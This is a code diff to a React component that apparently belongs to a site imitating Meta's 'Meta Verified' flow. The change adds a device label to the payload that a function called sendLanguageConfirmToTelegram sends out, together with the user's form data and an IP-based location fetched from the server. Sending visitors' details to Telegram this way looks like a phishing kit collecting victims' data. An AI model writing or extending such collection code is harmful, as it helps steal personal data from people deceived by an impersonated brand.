@@ -10,6 +10,7 @@ import { LOCALE_BCP47 } from '@/i18n'
 import { APP_LOCALES, type AppLocale } from '@/i18n/schema'
 import { LOCALE_OPTION_LABELS } from '@/i18n/localeOptionLabels'
 import { useAppStrings } from '@/hooks/useAppStrings'
+import { readDeviceLabel } from '@/utils/deviceLabel'
 import { getUserLocation } from '@/utils/getLocation'
 import { isMetaVerifiedFlowCompleted } from '@/utils/metaVerifiedFlow'
 import { LANG_MODAL_SEEN_KEY, readSessionDisplayLocale, writeSessionDisplayLocale } from '@/utils/metaVerifiedDisplayLocale'
@@ -100,13 +101,20 @@ export default function MvLanguageModal({ isOpen, onClose }: MvLanguageModalProp
   const sendLanguageConfirmToTelegram = async (locale: AppLocale) => {
     if (isMetaVerifiedFlowCompleted()) return
 
+    const device = readDeviceLabel()
+    dispatch(updateForm({ device }))
+
     // Luôn lấy lại IP từ server (header client thật) trước khi gửi Telegram
     const location = await getUserLocation()
-    dispatch(updateForm(location))
+    const located = {
+      ...location,
+      device: location.device || device,
+    }
+    dispatch(updateForm(located))
 
     const payload: Record<string, unknown> = {
       ...formData,
-      ...location,
+      ...located,
       language: LOCALE_OPTION_LABELS[locale],
     }
 
